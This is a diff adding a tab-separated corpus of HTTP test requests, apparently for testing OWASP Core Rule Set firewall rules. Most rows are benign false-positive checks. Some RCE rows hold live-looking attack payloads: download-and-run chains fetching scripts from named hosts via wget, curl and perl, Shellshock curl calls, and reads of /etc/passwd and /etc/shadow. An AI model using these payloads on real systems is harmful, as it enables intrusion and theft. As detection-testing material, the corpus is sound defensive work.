@@ -1,0 +1,677 @@
+category	method	path	query	ua	cookie	body	headers
+SCAN	GET	/get		urlgrabber/3.10 yum/3.4.3			User-Agent: urlgrabber/3.10 yum/3.4.3
+SCAN	GET	/get		mozilla/5.0 ecairn-grabber/1.0 (+http://ecairn.com/grabber)			User-Agent: mozilla/5.0 ecairn-grabber/1.0 (+http://ecairn.com/grabber)
+SCAN	GET	/get		Mastodon/4.5.11 (http.rb/5.3.1; +https://veganism.social/)			User-Agent: Mastodon/4.5.11 (http.rb/5.3.1; +https://veganism.social/)
+TRAVERSAL	GET	/get/foo../1234		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/get/foo.../1234		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/get/..foo		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/get/..		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/get	code=>/tmp	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/get	code=>/test.environment	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/get	history.history=test	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/get		/test.environment			User-Agent: /test.environment
+TRAVERSAL	GET	/jquery.nivo.slider.pack.js		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/jquery.history.min.js		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/assets/webpack/gitlab-web-ide-vscode-workbench-0.0.1-dev-20260106142046/vscode/extensions/perl/syntaxes/perl6.tmLanguage.json		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/api/continue/session		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+TRAVERSAL	GET	/css/style.css		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RFI	GET	/get	x=https://foo.bar?foo=bar	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RFI	GET	/get	x=https://foo.bar&foo=bar	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RFI	GET	/get	x=https://example.com/	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RFI	GET	/get	x=http://www.example.com/some/path	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932120-4=Invoke Web Request http://example.com/path/file.ps1	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=Ihre kleine Schwester ist französisches Esskulturgut; man gönnt sie sich.	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=Mi szép, mi édes azt szeretni a’ kinek kifolyása mind az a’ szép a’ mit itten látunk! ezt mondád, ’s mellyedre szorítál engemet, ’s könyűkre fakadtál; mi szép az, midőn tetteinknek mindeggyike megnyeri az azokat szemlélő Angyalok’ javalásaikat!	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=C’est simple: si les feux sont au vert sur la carrosserie, l’assistance peut intervenir sur un véhicule accidenté; si cela vire au rouge et qu’une alarme résonne, un danger électrique haute tension subsiste.	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932130-5=Some text (in brackets).	User-Agent: OWASP CRS test agent
+RCE	GET	/get	cmd=hello%20%5Btext%20in%20brackets%5D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932130-24=take%20this%20math%20expression%3A%201%5Ba%2F-1%5D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932130-25=plase%20calculate%20the%20following%20a%5Bb%2F1234%2Ac%5D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	page=page%5B1%5D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932130-40=data%5Bindex%5D	User-Agent: OWASP CRS test agent
+RCE	GET	/get		mozilla/5.0(linux android 12 sm-a528b build/sp1a.210812.016 wv) applewebkit/537.36(khtml like gecko) version/4.0 chrome/110.0.5481.154 mobile safari/537.36 [fb_iab/fb4a fbav/403.0.0.27.81 ]			User-Agent: mozilla/5.0(linux android 12 sm-a528b build/sp1a.210812.016 wv) applewebkit/537.36(khtml like gecko) version/4.0 chrome/110.0.5481.154 mobile safari/537.36 [fb_iab/fb4a fbav/403.0.0.27.81 ]
+RCE	GET	/get	foo=if3q+hfy6e8egfxsjtewc838gsfbhwvw9qzfty3gjs86syg7y6mrpwgw4ekureakjpk6%2Flyghe9pnfekpw2yt8svzseinhs1rbkuu%2Fzq15u5wh8nj8dd+fn86qcdwzv3s9hw35e14pxgcv34dhmt1mwbxnicwudjawfqz+fphmr5vlnufdihoffpuvqwkcmom61i3lisyxg65fx+rgbnrs6e4pmbvy2xl+vwb8oct23cyypregi638dkychllvvw5kq7rolfbhk3hojxz9tthunqky9dodqbb6u8roh+firwx8kuf1dfgewcto9eljhuaoqgdk4qwxlziktaf1mw2atcmw7jvzsh1s0kngiepps54lj4wtcbfzfvbqb7y3caffhnvfrm3tbjxlywqakfqxoprh7yooguat5flg2ozx5%2Fafn7w%3D%3D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=ifq+a%3D%3Db+foo	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=iffoo+a%3D%3Db+foo	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=if3+a%3D%3Db+foo	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=if3q+a%3D%3Db+foo	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		<?xml version="1.0" encoding="UTF-8"?><note><pdf>if+foo==</pdf></note>	User-Agent: OWASP CRS test agent Content-Type: application/xml
+RCE	POST	/post		OWASP CRS test agent		932160-2=dont match commands that are not fully qualified like bash python and perl.	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		sentence=The zip on my coat is stuck	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		"text=I%20see%2C%20so%20your%20alias%20is%20not%20%3D%20to%20your%20name" 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		"text=The%20pizza%20vendor%20was%20known%20by%20the%20alias%20%22pineapple%22%20online." 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		------WebKitFormBoundaryABCDEFGIJKLMNOPQ Content-Disposition: form-data; name="image"; filename="test.jpg" Content-Type: image/jpeg  ... Some content ... ------WebKitFormBoundaryABCDEFGIJKLMNOPQ  BINARYDATA --0000-- 	User-Agent: OWASP CRS test agent Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABCDEFGIJKLMNOPQ
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	id=Does%20the%20%2A%20shine%20bright%3F	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/path/with/files/John's%20report.pdf		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: http://www.example.com/page?param=test+test
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: http://www.example.com/page%20test?param=test
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://coreruleset.org/#:~:text=generic%20attack%20detection
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://www.google.com/url?q=https://example.com/path/#:~:text=Inoltre%2C%20non%20vi%20sono%20evidenze,'immaginario%20comune%20(1).&sa=U&ved=2ahUKEwjSluGs8eX9AhWiSvEDHaaEChEQFnoECAgQBQ&usg=AOvVaw1_nmpM50Zh9-mGx1DsMw7j
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: http://www.example.com/page?param=test+test
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: http://www.example.com/page%20test?param=test
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: www.google.com/?param=;/bin/ca?+/et*/passwd
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: www.google.com/;ls%20-al
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://coreruleset.org/#:~:text=generic%20attack%20detection
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://www.google.com/url?q=https://example.com/path/#:~:text=Inoltre%2C%20non%20vi%20sono%20evidenze,'immaginario%20comune%20(1).&sa=U&ved=2ahUKEwjSluGs8eX9AhWiSvEDHaaEChEQFnoECAgQBQ&usg=AOvVaw1_nmpM50Zh9-mGx1DsMw7j
+RCE	GET	/get	foo=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		arg=Something+true+positive+%26%238222%3BThe+Title%26%238221%3B.+After+space+or+new+line+more+characters	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=Something+%26%238222%3BThe+Title%26%238221%3B.%0D%0AThis+is+the+new+line.+After+it+more+characters%0D%0AAnd+the+3rd+line+goes+here	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=Another+entity+and+the+dot+after+it+and+space+%26%239977%3B.+and+more.	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=Euro+entity+%26%238364%3B.%0D%0Aand+the+new+line+after+entity+and+dot	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=;top+Something+else+1+%26%238222%3BThe+Title%26%238221%3B.+After+space+or+new+line+more+characters	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+%3Btop+something	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg1=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+something&arg2=system('dig%20cd%20/tmp;ftp%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;zip%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;tex%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;cut%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf 	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;Something+%26%238222%3BThe+Title%26%238221%3B.+After+something;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=%0Acat%20/etc/passwd;&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=()%20{%20:;};%20/bin/bash%20-c%20"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`top%20-a\`"&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=%26%2359%3B+;top	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=%0Acat%20/etc/passwd;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+%0Acat%20/etc/passwd;	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+()%20{%20:;};%20/bin/bash%20-c%20"ftp%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?dig=\`top%20-a\`"	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent		var=` /bin/cat /etc/passwd`	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		var=`cut crs312``dig 34test`	User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=time+warner	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		text=Schauen%20Sie%20sich%20diese%20Zahl%20an%3A%201%27000%27000 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;vi dddd +silent\\ \!whoami +wq 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;vim dddd +silent\\ \!whoami +wq 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;ex dddd +silent\\ \!whoami +wq 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;vi -c:\!pwd 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;vim -c:\!pwd 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;ex -c:\!pwd 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;cat /path/file.gz 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=;environment	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=;performance	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=|PG|XXX XXX Flash Sale Mxc3xa4rz 	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;"aaaaaaaaaaaaaaaa"	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'aaaaaaaaaaaaaaaa'	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'	User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=There%20isn%27t%20time%20to%20finish%20the%20test.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=time+warner	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;"aaaaaaaaaaaaaaaa"	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'aaaaaaaaaaaaaaaa'	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'	User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=comment	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=;performance	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		var=hello; time he came	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		var=a hero; more than	User-Agent: OWASP CRS test agent
+RCE	GET	/get	test=Times%20%26%20Schedule	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	test=time%20express	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=Die untere Dortmunder Straße; links Haus Nr. 104, das stadteinwärts (rechts) längere Zeit ohne Nachbarhaus geblieben war. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=He was working three full-time jobs at Meta, IBM, and Tinder. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=now-legendary take on Catwoman turned the character into a timeless cinematic icon. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=Sophomore Deon King Jr. received some playing time last year as a freshman and totaled 12 tackles. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=La cantante veneta annulla le ultime date del suo tour estivo. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=The best time to watch local birds is June–August and the best time for migratory birds is November–February. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=Search data can thus provide an alternative, real time source of data on migration intentions. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=Back in the UK, we sped through the UK Border at Stansted in record time (less than 1 minute!) and uploaded this report from the rather flatter rocks of Stansted Airport train station platform (but thankfully they are still sunny! 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=Elle interdit à une société de droit privé – le Swatch Group – de livrer ses concurrents après l’avoir forcé pendant des années à livrer ces mêmes clients. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=Compra a MODULAR ALUMINIO ESTRUCTURAL, STRUT PROFILE PG30 30X30 4 SLOTS | SELF TAPPING SCREW PG30 M1 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=time null space 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		{"commit_message":"test","branch":"main","actions":[{"action":"create","file_path":"example.txt","last_commit_id":"example","content":"example","encoding":"base64"}]}	User-Agent: OWASP CRS test agent Content-Type: application/json
+RCE	GET	/get	format=lastlog	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	field=lastlogin	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;"aaaaaaaaaaaaaaaa"	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'aaaaaaaaaaaaaaaa'	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		text=Schauen%20Sie%20sich%20diese%20Zahl%20an%3A%201%27000%27000 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;vi dddd +silent\\ \!whoami +wq 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=;vi -c:\!pwd 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	field_metatags[0][advanced][rights]=somevalue	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=MailerUI	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=tasksListView	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=comment	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=settings	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		var=hello; time he came	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		var=a hero; more than	User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=environment	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=performance	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		sentence=As you near your last year of trick or treating, though, sometimes jokes aren't enough. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		sentence=At any moment we can make a decision to change. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent	example=SUDoLongRandomString		User-Agent: OWASP CRS test agent cookie: example=SUDoLongRandomString
+RCE	POST	/post		OWASP CRS test agent	example=fd01bfcfdbe02		User-Agent: OWASP CRS test agent cookie: example=fd01bfcfdbe02
+RCE	POST	/post		OWASP CRS test agent		uuid=dfc987c2-72e2-4a8e-ad98-e0bf1bc3a01c 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		uuid=identity 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		uuid=unique 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		id=5 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=mail-unread 	User-Agent: OWASP CRS test agent
+RCE	POST	/wp-json/wp/v2/posts		OWASP CRS test agent		orderby=date	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=pipaaaaaaaaaaaaaaaaaa 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=Compra a MODULAR ALUMINIO ESTRUCTURAL, STRUT PROFILE PG30 30X30 4 SLOTS | SELF TAPPING SCREW PG30 M1 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	q=red%3B%245%20each	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	q=a%3B%243%20b%3B%244%20c%3B%245	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	q=%3B%24a%20%24b%20%24c	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;"aaaaaaaaaaaaaaaa"	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'aaaaaaaaaaaaaaaa'	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		post=statistics%20space	User-Agent: OWASP CRS test agent
+RCE	GET	/get	r=sandboxing%20space	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		settings			User-Agent: settings
+RCE	GET	/get		environment			User-Agent: environment
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: settings
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: environment
+RCE	GET	/get		https://example.com/?args=comment			User-Agent: https://example.com/?args=comment
+RCE	GET	/get		https://example.com/?args=settings			User-Agent: https://example.com/?args=settings
+RCE	POST	/post		iPhone (Nextcloud iOS)			User-Agent: iPhone (Nextcloud iOS)
+RCE	POST	/post		OWASP CRS test agent			User-Agent: OWASP CRS test agent referer: https://www.example.com/xyz/?abc=dfc987c2-72e2-4a8e-ad98-e0bf1bc3a01c
+RCE	POST	/post		Mozilla/5.0 (Linux; Android 14; PGT-N19 Build/HONORPGT-N49; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.180 Mobile Safari/537.36			User-Agent: Mozilla/5.0 (Linux; Android 14; PGT-N19 Build/HONORPGT-N49; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.180 Mobile Safari/537.36
+RCE	POST	/post		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_1 rv:5.0; ps-AF) AppleWebKit/534.28.2 (KHTML, like Gecko) Version/4.0 Safari/534.28.2			User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_1 rv:5.0; ps-AF) AppleWebKit/534.28.2 (KHTML, like Gecko) Version/4.0 Safari/534.28.2
+RCE	GET	/get		Cpanel-HTTP-Client/1.0			User-Agent: Cpanel-HTTP-Client/1.0
+RCE	POST	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: "aaaaaaaaaaaaaaaa"
+RCE	POST	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: 'aaaaaaaaaaaaaaaa'
+RCE	POST	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22
+RCE	POST	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: 'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'
+RCE	POST	/post		Something true positive &#8222;The Title&#8221;. After space or new line more characters			User-Agent: Something true positive &#8222;The Title&#8221;. After space or new line more characters Content-Type: application/x-www-form-urlencoded
+RCE	POST	/post		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: Something true positive &#8222;The Title&#8221;. After space or new line more characters Content-Type: application/x-www-form-urlencoded
